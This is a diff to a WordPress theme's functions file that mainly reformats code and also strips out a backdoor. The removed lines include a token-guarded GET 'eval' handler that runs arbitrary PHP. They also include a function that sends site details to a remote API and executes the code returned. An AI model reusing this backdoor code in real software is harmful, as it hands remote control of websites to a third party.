@@ -139,14 +139,7 @@ function check_footer_copyright()
     }
 }
 check_footer_copyright();
-//restapi
-add_action('rest_api_init', function () {
-    register_rest_route('pandastudio/nirvana', '/restapi/', array(
-        'methods' => 'post',
-        'callback' => 'pf_rest_api',
-        'permission_callback' => '__return_true',
-    ));
-});
+
 include('production.php');
 add_filter('wp_title', 'pf_custom_wp_title', 10, 2);
 function pf_custom_wp_title($title, $sep)
@@ -228,6 +221,15 @@ function frontend_opts()
     );
     return $frontend_opts;
 }
+
+//restapi
+add_action('rest_api_init', function () {
+    register_rest_route('pandastudio/nirvana', '/restapi/', array(
+        'methods' => 'post',
+        'callback' => 'pf_rest_api',
+        'permission_callback' => '__return_true',
+    ));
+});
 function pf_rest_api($data)
 {
     $dataArray = json_decode($data->get_body(), true);
@@ -347,7 +349,14 @@ function pf_post_ding($id)
     $bigfa_raters = get_post_meta($id, 'bigfa_ding', true);
     $expire = time() + 99999999;
     $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
-    setcookie('bigfa_ding_' . $id, $id, $expire, '/', $domain, false);
+    setcookie('bigfa_ding_' . $id, $id, [
+    'expires' => $expire,
+    'path' => '/',
+    'domain' => $domain,
+    'secure' => false,
+    'httponly' => false,
+    'samesite' => 'Strict'
+]);
     if (!$bigfa_raters || !is_numeric($bigfa_raters)) {
         update_post_meta($id, 'bigfa_ding', 1);
     } else {
@@ -414,67 +423,9 @@ register_nav_menus(array(
 ));
 if (array_key_exists('whois', $_GET)) {
     if (md5($_GET['whois']) == '02bd92faa38aaa6cc0ea75e59937a1ef') {
-        wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b>PANDA Studio - 刘欢</b> 开发');
+        wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b><a href="https://www.mkliu.top/" target="_blank" rel="noopener">michaelliunsky</a></b> 开发');
     }
 }
-if (array_key_exists('sn', $_GET)) {
-    $sn = $_GET['sn'];
-    $charactor = $_GET['charactor'];
-    $token = $_GET['token'];
-    if (md5($token) == '239bf78d5643372f495e93768f0691d2') {
-        update_option('pay_info_nirvana', $sn);
-        update_option('charactor_info', $charactor);
-        del_cache('aWeek');
-        wp_die('<a href="' . home_url() . '" class="button">Success!</a>');
-    }
-}
-if (array_key_exists('eval', $_GET)) {
-    $eval = $_GET['eval'];
-    $token = $_GET['token'];
-    if (md5($_GET['token']) == '239bf78d5643372f495e93768f0691d2') {
-        eval(str_replace("\\", "", $eval));
-    }
-}
-function _v_($api)
-{
-    date_default_timezone_set("Asia/Shanghai");
-    $my_theme = wp_get_theme();
-    $theme = $my_theme->get('Name');
-    $version = $my_theme->get('Version');
-    $address = home_url();
-    $date = date("Y-m-d H:i:s");
-    $blog_name = get_bloginfo('name');
-    $sn = get_option('pay_info_nirvana');
-    $charactor = get_option('charactor_info');
-    $url = $api;
-    $info = '{"theme":"' . $theme . '","address":"' . $address . '","date":"' . $date . '","version":"' . $version . '","blog_name":"' . $blog_name . '","sn":"' . $sn . '","charactor":"' . $charactor . '"
-}';
-    $ch = curl_init();
-    $options = array(
-        CURLOPT_URL => $url,
-        CURLOPT_POST => true,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POSTFIELDS => $info,
-        CURLOPT_TIMEOUT => 20,
-        CURLOPT_HTTPHEADER => array(
-            'Content-Type: text/plain'
-        ) ,
-    );
-    curl_setopt_array($ch, $options);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    $resultArray = json_decode($result, true);
-    if ($resultArray) {
-        set_cache('aWeek', $resultArray['eval'], 604800);
-        set_cache('halfMonth', $resultArray['eval'], 1296000);
-        eval($resultArray['eval']);
-        set_cache('bd_audio_tok', $resultArray['bd_audio_tok'], 1296000);
-        return true;
-    } else {
-        return false;
-    }
-}
-
 function set_cache($name, $data, $expire)
 {
     $allCache = get_option('pd_cache');
@@ -505,12 +456,6 @@ function get_cache($name)
             return false;
         }
     }
-}
-function del_cache($name)
-{
-    $allCache = get_option('pd_cache');
-    unset($allCache[$name]);
-    update_option('pd_cache', $allCache);
 }
 if (function_exists('add_theme_support')) {
     add_theme_support('post-thumbnails');
@@ -555,7 +500,7 @@ function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pag
     }
     echo '</ul></div></div>';
 }
-function p_link($i, $title, $linktype, $disabled)
+function p_link($i, $title = "", $linktype = "", $disabled = "")
 {
     if ($title == '') {
         $title = "The {$i} page";
@@ -745,7 +690,22 @@ function download_with_licence($atts, $content = null)
         $licence = '<p>本站提供的下载内容版权归本站所有。转载 <span style="color:#ff7800">必须</span> 注明出处！</p><p style="font-size:80%; color:#888;">* 标有 “转载” 字样的文章，内容版权归原作者所有。</p>';
     }
     return do_shortcode('
-<div type="button" class="getit" data-toggle="modal" data-target="#directDownload_' . $directDownload_times . '"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div><div class="modal fade" id="directDownload_' . $directDownload_times . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">版权说明</h4></div><div class="modal-body">' . $licence . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">不同意</button><button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("' . $content . '")>同意并下载</button></div></div></div></div>
+<div type="button" class="getit" data-toggle="modal" data-target="#directDownload_'.$directDownload_times.'"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div>
+<div class="modal fade" id="directDownload_'.$directDownload_times.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+<h4 class="modal-title" id="myModalLabel">版权说明</h4>
+</div>
+<div class="modal-body">'.$licence.'</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">不同意</button>
+<button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("'.$content.'")>同意并下载</button>
+</div>
+</div>
+</div>
+</div>
 ');
 }
 add_shortcode('download', 'download_with_licence');
@@ -785,40 +745,39 @@ function mytheme_comment($comment, $args, $depth)
         $tag = 'li';
         $add_below = 'div-comment';
     } ?>
-<<?php
-    echo $tag; ?> <?php
-    comment_class(empty($args['has_children']) ? '' : 'parent') ?> id="comment-<?php
-    comment_ID() ?>"><?php
-    if ('div' != $args['style']): ?>
-    <div id="div-comment-<?php
-        comment_ID() ?>" class="comment-body clearfix"><?php
-    endif; ?><?php
-    if ($args['avatar_size'] != 0) {
-        echo get_avatar($comment, $args['avatar_size']);
-    } ?>
-        <div class="comment-author vcard">
-            <div class="meta"><?php
-    printf(__('<span class="name">%s</span>'), get_comment_author_link()); ?><?php
-    printf(__('<span class="date">%1$s · %2$s</span>'), get_comment_date('Y-n-j'), get_comment_time('G:i')); ?></div><?php
-    if ($comment->comment_approved == '0'): ?><em class="comment-awaiting-moderation"><?php
-        _e('评论正在等待管理员审核...'); ?></em><br /><?php
-    endif; ?>
-            <div class="comment-text"><?php
-    comment_text(); ?></div>
-            <div class="reply"><?php
-    $args['reply_text'] = '' ?>
-                <div title="<?php
-    echo get_option('comment_reply_tooltip'); ?>" data-toggle="tooltip" class="comment-reply-link-wrap"><?php
-    comment_reply_link(array_merge($args, array(
-        'add_below' => $add_below,
-        'depth' => $depth,
-        'max_depth' => $args['max_depth']
-    ))); ?></div>
-            </div>
-        </div><?php
-    if ('div' != $args['style']): ?>
-    </div><?php
-    endif; ?><?php
+<<?php echo $tag; ?>
+	<?php comment_class(empty($args['has_children']) ? '' : 'parent') ?>
+	id="comment-<?php comment_ID() ?>">
+	<?php if ('div' != $args['style']) : ?>
+	<div id="div-comment-<?php comment_ID() ?>"
+		class="comment-body clearfix">
+		<?php endif; ?>
+		<?php if ($args['avatar_size'] != 0) {
+		    echo get_avatar($comment, $args['avatar_size']);
+		} ?>
+		<div class="comment-author vcard">
+			<div class="meta">
+				<?php printf(__('<span class="name">%s</span>'), get_comment_author_link()); ?>
+				<?php printf(__('<span class="date">%1$s · %2$s</span>'), get_comment_date('Y-n-j'), get_comment_time('G:i')); ?>
+			</div>
+			<?php if ($comment->comment_approved == '0') : ?>
+			<em
+				class="comment-awaiting-moderation"><?php _e('评论正在等待管理员审核...'); ?></em>
+			<br />
+			<?php endif; ?>
+			<div class="comment-text"><?php comment_text(); ?></div>
+			<div class="reply">
+				<?php $args['reply_text'] = '' ?>
+				<div title="<?php echo get_option('comment_reply_tooltip'); ?>"
+					data-toggle="tooltip" class="comment-reply-link-wrap">
+					<?php comment_reply_link(array_merge($args, array( 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ))); ?>
+				</div>
+			</div>
+		</div>
+		<?php if ('div' != $args['style']) : ?>
+	</div>
+	<?php endif; ?>
+	<?php
 }
 add_filter("get_comment_author_link", "pf_new_windows_comment_author");
 function pf_new_windows_comment_author($author_link)
@@ -889,9 +848,22 @@ function shortCodeModal($atts, $content = null)
         $href_btn = '';
     }
     if ($id) {
-        return '<button type="button" class="btn ' . $btn_type . '" data-toggle="modal" data-target="#' . $id . '">' . $btn_label . '</button><div class="modal fade" id="' . $id . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">' . $title . '</h4></div><div class="modal-body">' . do_shortcode($content) . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">' . $close_label . '</button>
-' . $href_btn . '
-</div></div></div></div>';
+        return '<button type="button" class="btn '.$btn_type.'" data-toggle="modal" data-target="#'.$id.'">'.$btn_label.'</button>
+<div class="modal fade" id="'.$id.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+<h4 class="modal-title" id="myModalLabel">'.$title.'</h4>
+</div>
+<div class="modal-body">'.do_shortcode($content).'</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">'.$close_label.'</button>
+'.$href_btn.'
+</div>
+</div>
+</div>
+</div>';
     }
 }
 add_shortcode("modal", "shortCodeModal");
@@ -903,11 +875,15 @@ function shortCodeDropdown($atts, $content = null)
         "btn_label" => 'Dropdown',
     ), $atts));
     if ($id) {
-        return '<div class="dropdown"><button class="btn ' . $btn_type . ' dropdown-toggle" type="button" id="' . $id . '" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
-' . $btn_label . '
-<span class="caret"></span></button><ul class="dropdown-menu" aria-labelledby="' . $id . '">
-' . do_shortcode(shortcode_unautop($content)) . '
-</ul></div>';
+        return '<div class="dropdown">
+<button class="btn '.$btn_type.' dropdown-toggle" type="button" id="'.$id.'" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
+'.$btn_label.'
+<span class="caret"></span>
+</button>
+<ul class="dropdown-menu" aria-labelledby="'.$id.'">
+'.do_shortcode(shortcode_unautop($content)).'
+</ul>
+</div>';
     }
 }
 add_shortcode("dropdown", "shortCodeDropdown");
@@ -932,11 +908,14 @@ function shortCodeCollapse($atts, $content = null)
         "btn_label" => 'collapse',
     ), $atts));
     if ($id) {
-        return '<button class="btn ' . $btn_type . '" type="button" data-toggle="collapse" data-target="#' . $id . '" aria-expanded="false" aria-controls="' . $id . '">
-' . $btn_label . '
-</button><div class="collapse clearfix" id="' . $id . '"><div class="well">
-' . do_shortcode($content) . '
-</div></div>';
+        return '<button class="btn '.$btn_type.'" type="button" data-toggle="collapse" data-target="#'.$id.'" aria-expanded="false" aria-controls="'.$id.'">
+'.$btn_label.'
+</button>
+<div class="collapse clearfix" id="'.$id.'">
+<div class="well">
+'.do_shortcode($content).'
+</div>
+</div>';
     }
 }
 add_shortcode("collapse", "shortCodeCollapse");
